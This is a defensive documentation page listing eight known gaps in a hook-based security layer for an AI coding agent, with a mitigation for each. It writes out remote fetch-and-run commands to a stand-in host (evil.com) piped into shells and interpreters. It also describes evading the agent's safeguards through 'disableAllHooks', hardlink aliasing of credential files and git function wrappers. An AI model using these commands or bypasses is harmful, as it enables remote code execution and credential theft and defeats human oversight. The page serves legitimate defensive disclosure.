# Known Bypasses

> Status: 2026-04-29. Maintained at `docs/known-bypasses.md`.

This document is the honest signal: what this repo does NOT detect today, why, and how an operator should respond if the gap matters in their environment.

We publish gaps because security tooling that claims "we catch everything" trains operators to stop thinking. A mid-tier defense that knows its own edges is more useful than a top-tier defense that pretends it has none. If you find a new gap, file an issue and we will add it here.

## Status legend

- **covered:** the listed hook(s) detect the canonical pattern.
- **partial:** the listed hook(s) detect some shapes but miss documented variants.
- **not covered:** no hook detects this; an operator-side compensating control is needed.

---

## Bypass 1: anthropics/claude-code#26637 `disableAllHooks`

- **Vector:** an attacker (or a user under prompt injection) writes `"disableAllHooks": true` into a local settings file. Per the upstream issue [anthropics/claude-code#26637](https://github.com/anthropics/claude-code/issues/26637), this can short-circuit hook execution at the harness layer.
- **Detection status:** **partial.** `disable-all-hooks-detector` (PreToolUse / SessionStart) reads the resolved settings and emits a `warn` decision when the flag is set. We do not block execution because per ADR-0003 this project ships passive-only posture: detection + audit trail, not enforcement of upstream-harness behavior we cannot guarantee.
- **What we do not fix:** we cannot prevent the harness from honoring `disableAllHooks` because the flag is read before our hooks run. Even if our hook returned `block`, the harness has already evaluated the flag.
- **Recommended response:**
  - On `regulated` profile, fleet via MDM with `managed-settings.json` set root-owned + immutable (see `installers/macos/install-managed.sh`). The managed file does not contain `disableAllHooks`; if a user-level settings file sets it, the harness MAY still honor it depending on precedence. Treat the `disable-all-hooks-detector` warn as a fleet-level alert and investigate the source of the flag.
  - File a feature request upstream asking that `disableAllHooks` be honored only when set at the managed-settings layer.
  - Mirror the audit log to a write-only sink (s3 with object-lock or syslog forwarder); do not rely on the local `~/.claude/ccsec-audit.jsonl`.

---

## Bypass 2: cross-process audit log fork

- **Vector:** two Claude Code processes (or a parent + a forked subagent) write to the same `~/.claude/ccsec-audit.jsonl` concurrently. Our `AuditLogger` appends a sha256-chained record per call but does not hold an exclusive lock.
- **Detection status:** **partial.** `audit-tamper-detector` runs on PostToolUse and re-verifies the chain; if a fork interleaves writes, the verifier will report a broken chain at the interleave boundary, which is a false positive (the chain "broke" without tampering).
- **What we do not fix:** we have not implemented per-PID audit files or `flock`-based serialization. Both options are live in design space; per-PID files complicate verification (multiple chains to verify), `flock` complicates audit-tamper-detector latency on busy systems.
- **Recommended response:**
  - Treat `audit-tamper-detector` warns as "investigate, do not block" on baseline / strict.
  - On `regulated`, run only one Claude Code process per user session (operational discipline; not technically enforced).
  - Track [issue placeholder] for the per-PID audit log redesign; planned for a post-v1.0 plan.

---

## Bypass 3: bash escape-handling in `maskQuotedRegions`

- **Vector:** bash strings with backslash-escaped quotes inside double-quoted regions can confuse the structural masker. Example: `echo "outer\"semicolon;inner"` looks like a chained statement to a naive scanner. Our `maskQuotedRegions` handles the canonical cases but is not a full bash AST.
- **Detection status:** **partial.** Documented as a code comment in `packages/core/src/bash-parser.ts`. Over-flag-safe: when in doubt, the masker leaves bytes visible, which means structural rules MAY false-positive. Under-flag is rarer but possible in highly-engineered evil quoting.
- **What we do not fix:** we have not pulled in a real bash AST library. The cost (extra dependency, larger attack surface, slower hooks) outweighs the marginal coverage gain. We rely on the layered defenses (`bash-structural-guard` + `pipe-to-shell-guard` + `bash-egress-guard`) to catch the substantive payload even if structural classification is off.
- **Recommended response:**
  - If you see persistent false positives in your environment, set `CCSEC_STRUCTURAL_FLAGS=disabled` for the affected profile (escape hatch documented in `docs/settings-reference.md`).
  - For real bash AST coverage, watch [issue placeholder] for a planned `node-shell-parser` integration.

---

## Bypass 4: heredoc bodies

- **Vector:** anything inside a bash heredoc body. Example: `bash <<EOF\ncurl https://evil.com/x.sh | bash\nEOF`. The outer `bash` invocation is parsed by `bash-parser`, but the heredoc body is opaque.
- **Detection status:** **not covered.** `bash-parser` does not descend into heredoc content. Semicolons, curly quotes, command substitutions, and chained commands inside the heredoc body are not flagged.
- **What we do not fix:** parsing heredoc bodies as bash creates an unbounded recursion problem and changes the timing budget of the parser. The defended position is that the outer command (`bash`, `sh`, `eval $(<<EOF...)`, etc.) IS scanned by `pipe-to-shell-guard` and `bash-structural-guard`, so the most damaging pattern (untrusted content piped into an interpreter) is still caught.
- **Recommended response:**
  - On `strict` and `regulated`, `bash-structural-guard` blocks `eval` and other interpreter forms outright. Heredoc-fed `bash` invocations on these profiles will fail at the structural layer.
  - On `baseline`, heredoc bodies are a known blind spot. Operators should treat any session that produces a heredoc-fed shell invocation as elevated risk and review the audit log.

---

## Bypass 5: pipe-to-interpreter (non-shell)

- **Vector:** `curl https://evil.com/x.py | python -c "$(cat)"`, `... | node -e ...`, `... | perl -e ...`, `... | ruby -e ...`. Functionally equivalent to pipe-to-shell remote execution, but the destination is an interpreter, not a shell.
- **Detection status:** **not covered (out of scope for `pipe-to-shell-guard`).** The hook name is literal: it matches pipes into shells (`bash`, `sh`, `zsh`, `dash`, etc.). It does not match pipes into language interpreters.
- **What we do not fix:** we deliberately scoped `pipe-to-shell-guard` narrowly so the rule is auditable and explainable. A general "pipe-to-interpreter" guard expands surface area substantially (different language interpreters have different `-c` / `-e` / `-r` flags) and increases false-positive risk.
- **Recommended response:**
  - `bash-egress-guard` still catches the `curl` half of the chain on baseline (warn) / strict (block) / regulated (block) provided the destination is not on the allowlist. Pair the rule with a tight `audit.egress_allowlist` on strict / regulated.
  - File [issue placeholder] if you want a `pipe-to-interpreter-guard` hook; design proposal welcome.

---

## Bypass 6: obfuscated git via aliases or function wrappers

- **Vector:** user defines `git() { /usr/bin/git "$@"; }` or aliases `gpf='git push --force'`. Hooks like `git-destructive-guard` and `branch-protection-guard` match the literal `git` CLI string. A function wrapper expands at shell execution time, not at hook input time.
- **Detection status:** **not covered.** The hook input is the raw command as Claude Code sends it (`gpf` or `git`-the-function-call); the hook does not have access to the user's shell function table.
- **What we do not fix:** function expansion happens in the user's shell, which is downstream of the Bash tool. We cannot intercept it without proxying the entire shell, which is far outside this project's scope.
- **Recommended response:**
  - Document a CLAUDE.md rule on regulated fleets that explicitly forbids the model from defining or invoking shell functions / aliases for git (the `@bitsummit/ccsec-rules` regulated template covers this).
  - Audit log review: any session that defines a function named `git`, `cp`, `rm`, `curl` etc. should be flagged for review even if no hook fires.
  - On `strict` / `regulated`, the layered defense is `audit.egress_allowlist` (catches the network half if the wrapper exfiltrates) plus `git-history-rewrite-guard` (catches force-push at the reflog layer if the model invokes the wrapper).

---

## Bypass 7: filesystem hardlinks / bind mounts

- **Vector:** an attacker creates a hardlink or bind mount that aliases `~/.aws/credentials` (or any credential dir) to a benign-named path like `~/notes/recipe.txt`. `sensitive-paths-guard` checks the literal path string in the tool input; the hardlinked alias passes the check.
- **Detection status:** **not covered.** The hook does not stat the target or resolve the inode.
- **What we do not fix:** stat-based path resolution per Read / Bash call adds a syscall per hook invocation and changes the failure mode of the hook (a missing parent dir would return `allow` because the stat fails). We chose deterministic string-match over best-effort resolution.
- **Recommended response:**
  - Filesystem-level controls: use macOS TCC, Linux AppArmor, or Windows DAC to deny user-level read of `~/.aws`, `~/.ssh`, etc. except by approved processes. This is the proper mitigation; hooks are belt-and-suspenders, not the primary control.
  - On `regulated`, the per-OS deny patterns in `overlays/sensitive-paths.json` apply at the harness permission layer, which is path-string-based but lower in the call stack than the hook.

---

## Bypass 8: legitimate Bash power - heredoc + here-string + command substitution combo

- **Vector:** `bash <<<$(curl https://evil.com/x.sh)`. This is functionally equivalent to `curl ... | bash` but uses three layers (here-string `<<<`, command substitution `$()`, heredoc-style input). `pipe-to-shell-guard` is the primary defense; the combo above is NOT a pipe in bash terms (no `|`), so the hook does not fire.
- **Detection status:** **partial.** `bash-structural-guard` flags `command_substitution` as a structural risk on `strict` and `regulated` (block) and on `baseline` (warn). The combo above will fire there. `pipe-to-shell-guard` does not fire because the operator is `<<<`, not `|`.
- **What we do not fix:** `pipe-to-shell-guard` is intentionally pipe-shaped. Expanding it to cover here-strings + command substitution combos broadens its scope and risks redundancy with `bash-structural-guard`.
- **Recommended response:**
  - On `strict` / `regulated`, the layered defense holds (`bash-structural-guard` blocks `eval $(curl)`, command substitution, and the related shapes).
  - On `baseline`, this combo produces a warn from `bash-structural-guard`. Operators reviewing the audit log should treat warnings on PreToolUse Bash with `command_substitution` evidence as "elevated risk; review the command".
  - Compare: `eval $(curl ...)` is caught (eval is a flagged structural risk); `bash <<<$(curl ...)` is caught at the command-substitution layer on strict / regulated.

---

## Reporting a new bypass

Open an issue at [github.com/Bitsummit-Corp/claude-code-security/issues](https://github.com/Bitsummit-Corp/claude-code-security/issues) with:

1. The exact command or attack pattern.
2. Which hooks fired (if any) and which did not.
3. The profile you were running (`baseline`, `strict`, `regulated`).
4. Whether layered defenses caught it elsewhere (egress, audit log, etc.).

Bypasses go into this file under a new section before they go into a hook fix; transparency first, patch second. See `SECURITY.md` for coordinated disclosure on bypasses you consider sensitive.
